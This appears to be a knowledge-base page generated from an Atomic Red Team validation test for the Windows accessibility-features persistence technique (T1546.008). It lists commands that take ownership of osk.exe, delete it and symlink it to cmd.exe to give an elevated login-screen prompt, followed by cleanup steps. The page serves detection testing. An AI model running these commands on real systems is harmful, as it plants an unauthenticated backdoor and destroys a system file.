---
atomic_guid: "51ef369c-5e87-4f33-88cd-6d61be63edf2"
title: "Create Symbolic Link From osk.exe to cmd.exe"
framework: "atomic"
generated: "true"
attack_technique_id: "T1546.008"
attack_technique_name: "Event Triggered Execution: Accessibility Features"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.008/T1546.008.yaml"
build_date: "2026-04-26 17:02:13"
executor: "command_prompt"
aliases:
  - "51ef369c-5e87-4f33-88cd-6d61be63edf2"
  - "Create Symbolic Link From osk.exe to cmd.exe"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Create Symbolic Link From osk.exe to cmd.exe

Replace accessiblity executable with cmd.exe to provide elevated command prompt from login screen without logging in.

## Metadata

- Atomic GUID: 51ef369c-5e87-4f33-88cd-6d61be63edf2
- Technique: T1546.008: Event Triggered Execution: Accessibility Features
- Platforms: windows
- Executor: command_prompt
- Elevation Required: True
- Source Path: atomics/T1546.008/T1546.008.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1546-event_triggered_execution|T1546.008]]

## Executor

- elevation_required: True
- name: command_prompt

### Command

```cmd
IF NOT EXIST %windir%\System32\osk.exe.bak (copy %windir%\System32\osk.exe %windir%\System32\osk.exe.bak) ELSE ( pushd )
takeown /F %windir%\System32\osk.exe /A
icacls %windir%\System32\osk.exe /grant Administrators:F /t
del %windir%\System32\osk.exe
mklink %windir%\System32\osk.exe %windir%\System32\cmd.exe
```

### Cleanup

```cmd
takeown /F %windir%\System32\osk.exe /A
icacls %windir%\System32\osk.exe /grant Administrators:F /t
del %windir%\System32\osk.exe
copy /Y %windir%\System32\osk.exe.bak %windir%\System32\osk.exe
icacls %windir%\system32\osk.exe /inheritance:d
icacls %windir%\system32\osk.exe /setowner "NT SERVICE\TrustedInstaller"
icacls %windir%\System32\osk.exe /grant "NT SERVICE\TrustedInstaller":F /t
icacls %windir%\system32\osk.exe /grant:r SYSTEM:RX
icacls %windir%\system32\osk.exe /grant:r Administrators:RX
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.008/T1546.008.yaml)
